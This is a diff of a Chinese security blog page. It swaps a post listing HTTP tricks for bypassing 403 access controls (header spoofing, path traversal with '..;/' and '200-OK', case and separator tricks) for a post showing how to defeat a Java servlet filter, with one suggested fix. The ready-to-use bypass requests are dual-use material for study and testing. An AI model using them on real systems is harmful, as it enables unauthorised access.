-<h2 id="17、添加X-Rewrite-URL头"><a href="#17、添加X-Rewrite-URL头" class="headerlink" title="#17、添加X-Rewrite-URL头"></a><strong><u>#17、添加X-Rewrite-URL头</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1
-Host: api.host.com
-X-Rewrite-URL: /debug/
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="18、修改User-Agent头"><a href="#18、修改User-Agent头" class="headerlink" title="#18、修改User-Agent头"></a><strong><u>#18、修改User-Agent头</u></strong></h2><p>通过Intruder来批量fuzz可用的User-Agent头</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-User-Agent: FUZZ
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="19、通过反向代理的方式来尝试绕过"><a href="#19、通过反向代理的方式来尝试绕过" class="headerlink" title="#19、通过反向代理的方式来尝试绕过"></a><strong><u>#19、通过反向代理的方式来尝试绕过</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET http://api.host.com/debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="20、通过大小写转换的方式绕过"><a href="#20、通过大小写转换的方式绕过" class="headerlink" title="#20、通过大小写转换的方式绕过"></a><strong><u>#20、通过大小写转换的方式绕过</u></strong></h2><p>原数据：</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据:</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /DEBUG/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="21、添加200-OK绕过403"><a href="#21、添加200-OK绕过403" class="headerlink" title="#21、添加200-OK绕过403"></a><u><strong><em>#21、添加200-OK绕过403</em></strong></u></h2><p>如果有Apache作为代理，我们可以通过在接口中添加200-OK来绕过403</p>
-<p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /200-OK/..//debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>第二种方式是通过200-OK+%2e%2e的组合来绕过403</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /200-OK/%2e%2e/debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>第三种和第二种相似，只是我们在200-OK后面添加个空格</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /200-OK%20/%2e%2e/debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>第四种通过；来绕过限制</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /200-OK/;debug/ HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>除了在前面添加，我们也可以在后面添加</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug;/../200-OK HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="22、在接口后面添加？"><a href="#22、在接口后面添加？" class="headerlink" title="#22、在接口后面添加？"></a><strong><u>#22、在接口后面添加？</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /debug? HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="23、修改请求方法为小写"><a href="#23、修改请求方法为小写" class="headerlink" title="#23、修改请求方法为小写"></a><strong><u>#23、修改请求方法为小写</u></strong></h2><p>我们通过将请求方法修改为小写的方式来绕过，比如GET -&gt; GeT、POST -&gt; Post</p>
-<p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GeT /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="24、请求数据第一行添加-r-n"><a href="#24、请求数据第一行添加-r-n" class="headerlink" title="#24、请求数据第一行添加\r\n"></a><u><strong>#24、请求数据第一行添加\r\n</strong></u></h2><p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">\r\n
-GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="25、使用Content-type-0"><a href="#25、使用Content-type-0" class="headerlink" title="#25、使用Content-type: 0"></a><u>#25、使用Content-type: 0</u></h2><p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-type: 0
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="26、hop-by-hop"><a href="#26、hop-by-hop" class="headerlink" title="#26、hop-by-hop"></a><strong><u>#26、hop-by-hop</u></strong></h2><p>原数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>修改后的数据</p>
-<pre class="line-numbers language-html"><code class="language-html">GET /debug HTTP/1.1
-Host: api.host.com
-Content-Type: application/x-www-form-urlencoded
-Connection: Close, X-Real-Ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="27、x-user-id"><a href="#27、x-user-id" class="headerlink" title="#27、x-user-id"></a><strong><u>#27、x-user-id</u></strong></h2><pre class="line-numbers language-html"><code class="language-html">GET /api/users/1337 => 401
-
-GET /api/users/ 
-x-user-id: 1337 =>> 200 Ok
-
-POST /api/users/ 
-x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong><u>参考资料</u></strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/sting8k/BurpSuite_403Bypasser">https://github.com/sting8k/BurpSuite_403Bypasser</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/yunemse48/403bypasser">https://github.com/yunemse48/403bypasser</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0">https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gb344e2d586_0_0</a></p>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>​        简单解释下filter的作用，这里使用getRequestURI()获取url路径并赋值给变量url，如果获取到的路径为/system/login，则直接进入doFilter()放行，当获取到的路径中含有”.do”或者”.action”，且cookie不含有”admin=1”时，则进行拦截。<br>直接访问main.do响应”unauthorized access”<br><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221010215456098.png" alt="image-20221010215456098"></p>
+<h2 id="0x02-绕过思路"><a href="#0x02-绕过思路" class="headerlink" title="0x02 绕过思路"></a>0x02 绕过思路</h2><h3 id="1、-绕过"><a href="#1、-绕过" class="headerlink" title="1、../绕过"></a>1、../绕过</h3><p>我们先看看这块代码的逻辑</p>
+<pre class="line-numbers language-java"><code class="language-java">String url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/system/login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>​        当获取的路径是/system/login时，符合规则匹配，直接进入doFilter，这个时候我们可以使用../来跳转到根目录，即构造url是<a target="_blank" rel="noopener" href="http://192.168.3.2:8080/system/login/..;/..;/main.do%E6%97%B6%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%AE%BF%E9%97%AE%E7%9A%84http://192.168.3.2:8080/main.do%EF%BC%8C%E8%BE%BE%E5%88%B0%E4%BA%86%E6%88%91%E4%BB%AC%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82">http://192.168.3.2:8080/system/login/..;/..;/main.do时，实际上访问的http://192.168.3.2:8080/main.do，达到了我们权限绕过的目的。</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/195091/1662788489288-0cf8508e-6698-4779-adaa-abfd8adeb0ea.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/195091/1662788577527-8a719d92-d7c9-4e28-9d0c-43aee1ae2cd3.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/195091/1662788587300-3f78463f-d398-48b8-9f0e-254945f5403f.png" alt="image.png"></p>
+<p>修复方式也很简单，只要在代码中加入判断路径是否含有”../“即可</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2、分隔符绕过"><a href="#2、分隔符绕过" class="headerlink" title="2、分隔符绕过"></a>2、分隔符绕过</h3><p>上面的案例中，”/system.login”是一个白名单接口，访问它不需要经过filter，我们可以通过跳转的方式来绕过，那如果路径检测了非法符号的话呢？在URL中有个保留字符分号”;”，如果参数过多的情况下，使用分号；可以将其连接起来作为一个请求参数来传递，简单来说如果在URL中引入分隔符，通常是不会对正常接口造成影响的。<br>我们先看看以下的代码块</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".do"</span><span class="token punctuation">)</span> <span class="token operator">||</span> url<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"admin=1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"unauthorized access"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>当获取到的url结尾是”.do”或者是”.action”时，如果cookie不含有”admin=1”，则判断为未授权访问，意思就是如果我们的结尾不是”.do”或者”.action”，则直接放行，我们直接采用分隔符的方式绕过endsWith()的检测。<br>直接访问main.do响应未授权<br><img src="https://cdn.nlark.com/yuque/0/2022/png/195091/1662789350360-074d81d6-e9d9-4450-9c94-880eb147d4f4.png" alt="image.png"><br>加入分隔符就能绕过权限控制了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/195091/1662789384728-8e726d6e-1451-4ab1-8c52-448bcd1088c7.png" alt="image.png"></p>
+<h3 id="3、URL编码绕过"><a href="#3、URL编码绕过" class="headerlink" title="3、URL编码绕过"></a>3、URL编码绕过</h3><p>当filter走完对应的流程后，中间件会对请求的URL进行一次解码操作，然后再找到对应的Servlet进行访问，而在request.getRequestURL()和request.getRequestURI()这两个方法中并不会对请求的URL进行一次解码操作，也就是说我们可以对main.do进行一次url编码再引入两个方法中，这个时候规则匹配会失败，直接进入Servlet，从而达到权限绕过的目的。<br><a target="_blank" rel="noopener" href="http://192.168.3.2:8080/%6d%61%69%6e%2e%64%6f![image.png](https://cdn.nlark.com/yuque/0/2022/png/195091/1662792114023-488d34cf-a9ef-44cd-8e43-2c6badfba7ef.png)">http://192.168.3.2:8080/%6d%61%69%6e%2e%64%6f![image.png](https://cdn.nlark.com/yuque/0/2022/png/195091/1662792114023-488d34cf-a9ef-44cd-8e43-2c6badfba7ef.png)</a></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106799046">https://blog.csdn.net/qq_38154820/article/details/106799046</a></p>
 
                 
             </div>
@@ -799,7 +589,7 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/10/10/rao-guo-403-zong-jie/">http://example.com/2022/10/10/rao-guo-403-zong-jie/</a>
+                    <a href="http://example.com/2022/10/10/filter-quan-xian-rao-guo-zong-jie/">http://example.com/2022/10/10/filter-quan-xian-rao-guo-zong-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -836,11 +626,7 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1008,9 +794,10 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/10/10/filter-quan-xian-rao-guo-zong-jie/">
                     <div class="card-image">
@@ -1028,9 +815,9 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1039,6 +826,7 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1049,24 +837,24 @@ x-user-id: 1337 =>> 200 Ok<span aria-hidden="true" class="line-numbers-rows"><sp
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/01/22/wo-de-xin-xi-shou-ji-lun/">
+                <a href="/2022/10/10/rao-guo-403-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/12.jpg" class="responsive-img" alt="我的信息收集论">
+                        <img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/09.jpg" class="responsive-img" alt="绕过403总结">
                         
-                        <span class="card-title">我的信息收集论</span>
+                        <span class="card-title">绕过403总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一、前言众所周知，做漏洞挖掘前期的信息收集工作起着非常大的作用，可以说信息收集的工作决定了你在做漏洞挖掘时的效率，本篇文章旨在记录下我的信息收集准备工作。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-10
                             </span>
                         <span class="publish-author">
                             
